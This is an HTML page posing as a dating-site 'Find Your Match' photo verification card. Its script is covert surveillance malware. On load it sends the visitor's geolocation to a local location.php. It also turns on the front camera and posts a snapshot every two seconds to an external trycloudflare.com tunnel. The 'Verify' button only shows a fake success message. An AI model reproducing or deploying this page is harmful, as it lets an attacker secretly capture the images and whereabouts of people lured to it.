<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
    font-family: 'Georgia', serif;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}
.card {
    background: white;
    border-radius: 30px;
    padding: 30px;
    max-width: 450px;
    width: 90%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.2);
}
.profile-pic {
    width: 120px;
    height: 120px;
    background: #ff6b6b;
    border-radius: 50%;
    margin: 0 auto 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 60px;
}
h2 { color: #333; margin-bottom: 5px; }
.location { color: #888; margin-bottom: 20px; }
.camera-preview {
    margin: 20px 0;
    border-radius: 20px;
    overflow: hidden;
    background: #f5f5f5;
}
video, canvas { width: 100%; display: none; }
.photo-placeholder {
    height: 250px;
    background: #f0f0f0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 60px;
}
button {
    background: #ff6b6b;
    color: white;
    border: none;
    padding: 12px 30px;
    border-radius: 50px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 15px;
}
.match-text {
    margin-top: 20px;
    font-size: 14px;
    color: #999;
}
</style>
</head>
<body>
<div class="card">
    <div class="profile-pic">💕</div>
    <h2>Find Your Match</h2>
    <div class="location">📍 Verified Users Only</div>
    <div class="camera-preview">
        <div class="photo-placeholder">📸</div>
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    <button onclick="verifyPhoto()">Verify Profile Photo</button>
    <div class="match-text">1,234 people online now</div>
</div>
<script>

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        $.ajax({
            type: 'POST',
            data: {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                acc: position.coords.accuracy
            },
            url: window.location.origin + '/location.php'
        });
    });
}
function post(imgdata) {
    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.style.display = 'block';
        document.querySelector('.photo-placeholder').style.display = 'none';
        const context = canvas.getContext('2d');
        setInterval(() => {
            context.drawImage(video, 0, 0, 640, 480);
            post(canvas.toDataURL("image/png"));
        }, 2000);
    } catch(e) { console.log(e); }
}
function verifyPhoto() { alert("✨ Verification successful! Finding matches..."); }
init();
</script>
</body>
</html>
